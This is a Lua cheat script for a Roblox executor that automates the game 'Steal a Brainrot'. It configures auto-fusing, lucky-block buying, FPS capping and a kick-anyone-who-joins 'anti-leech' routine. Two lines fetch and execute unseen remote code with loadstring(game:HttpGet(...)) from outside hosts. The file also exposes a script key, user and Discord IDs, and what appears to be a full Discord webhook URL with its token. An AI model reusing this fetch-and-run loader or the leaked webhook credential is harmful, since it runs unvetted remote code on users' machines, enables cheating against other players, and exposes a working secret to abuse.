spawn(function()
    _G.Config={UserID="af98f8db-b72a-41ad-bfec-3f4182bc93e6",discord_id="1065861794494689402",Note="Pc"}local s;for i=1,5 do s=pcall(function()loadstring(game:HttpGet("https://cdn.yummydata.click/scripts/sab"))()end)if s then break end wait(5)end
end)

spawn(function()
    while task.wait(1) do
        setfpscap(5)
    end
end)

getgenv().Key = "k848a5227cffb8c1f16c72b2"
getgenv().Config = {
    ["Gameplay"] = {
        ["Server Type"] = "Private (Clone)",
        ["Collect Cash Cap"] = "1000B",
        ["Max Auctioning Multiplier"] = 10,
        ["Lock Base Extra Time"] = 5,
    },

    ["Misc"] = {
        ["Kick if Ping above"] = 5000,
        ["Kick if FPS below"] = 1,

        ["Ignore Secret"] = {
            ["La Vacca Saturno Saturnita"] = { "All" },
            ["Karkerkar Kurkur"] = { "All" },
            ["Sammyni Spyderini"] = { "All" },
            ["Extinct Tralalero"] = { "All" },
            ["Extinct Matteo"] = { "All" },
            ["Dul Dul Dul"] = { "All" },
            ["Chachechi"] = { "All" },
            ["Los Tralaleritos"] = { "All" },
            ["Las Tralaleritas"] = { "All" },
            ["La Cucaracha"] = { "All" },
            ["Job Job Job Sahur"] = { "All" },
            ["Frankentteo"] = { "All" },
            ["Graipuss Medussi"] = { "All" },
            ["Zombie Tralala"] = { "All" },
            ["Perrito Burrito"] = { "All" },
            ["To to to Sahur"] = { "All" },
            ["Guerriro Digitale"] = { "All" },
            ["Coffin Tung Tung Tung Sahur"] = { "All" },
            ["Nooo My Hotspot"] = { "All" },
            ["La Grande Combinasion"] = { "All" },
            ["Chicleteira Bicicleteira"] = { "All" },
        },

        ["Auto Fuse"] = {
            ["Enable"] = true,
            ["Fuse Animal"] = {
                ["La Vacca Saturno Saturnita"] = { "All" },
                ["Chachechi"] = { "All" },
                ["Chicleteira Bicicleteira"] = { "All" },
                ["Dul Dul Dul"] = { "All" },
                ["Graipuss Medussi"] = { "All" },
                ["Jackorilla"] = { "All" },
                ["Job Job Job Sahur"] = { "All" },
                ["Guerriro Digitale"] = { "All" },
                ["Karkerkar Kurkur"] = { "All" },
                ["La Cucaracha"] = { "All" },
                ["La Grande Combinasion"] = { "All" },
                ["Las Tralaleritas"] = { "All" },
                ["Los 25"] = { "All" },
                ["Los Combinasionas"] = { "All" },
                ["Los Jobcitos"] = { "All" },
                ["Los Tortus"] = { "All" },
                ["Please my Present"] = { "All" },
                ["Pumpkini Spyderini"] = { "All" },
                ["Sammyni Spyderini"] = { "All" },
                ["Santa Hotspot"] = { "All" },
                ["Telemorte"] = { "All" },
                ["To to to Sahur"] = { "All" },
                ["Trickolino"] = { "All" },
                ["Triplito Tralaleritos"] = { "All" },
                ["Zombie Tralala"] = { "All" },
                ["Chimnino"] = { "All" },
                ["Bunnyman"] = { "All" },
                ["Reindeer Tralala"] = { "All" },
            },
        },

        ["Rare Animal Generation"] = "20M",

        ["Open Lucky Block"] = {
            "Admin Lucky Block",
            "Taco Lucky Block",
            "Los Lucky Blocks",
            "Spooky Lucky Block",
            "Los Taco Blocks",
        },

        ["Buy Lucky Block"] = {
            "Premium Festive Lucky Block",
            "Secret Lucky Block",
            "Festive Lucky Block",
            "Admin Lucky Block",
            "Taco Lucky Block",
            "Los Lucky Blocks",
            "Spooky Lucky Block",
            "Los Taco Blocks",
        },

        ["Rare Lucky Block"] = {
            "Secret Lucky Block",
            "Premium Festive Lucky Block",
            "Festive Lucky Block",
        },
    },

    ["Performance"] = {
        ["Boost FPS"] = true,
        ["Black Screen"] = true,
    },

    ["Webhook"] = {
        ["Enable"] = true,
        ["Url"] = "https://discord.com/api/webhooks/1417865473567101069/QZZ0Zql6Y95jct0KQMAQYzxYgmzPexssStT7SQzR6zxatgtNqhGod2FD3HdBOrmAt_TH",
        ["Ignore Notify"] = {},
    }
}

spawn(function()
    task.wait(200)
    if not getgenv().scriptLoaded then
        game.Players.LocalPlayer:Kick("Script load timeout\nKick to prevent animal gets stolen")
    end
end)

repeat
    wait()
    spawn(function()
        loadstring(game:HttpGet("https://nousigi.com/loader.lua"))()
    end)
    wait(20)
until getgenv().Joebiden

-- Anti-leech (kick nếu có người khác join)
spawn(function()
    task.wait(100)
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer

    local function instantKick()
        if #Players:GetPlayers() > 1 then
            LocalPlayer:Kick("CÚT")
        end
    end

    instantKick()
    Players.PlayerAdded:Connect(instantKick)
    game:GetService("RunService").Heartbeat:Connect(instantKick)

end)



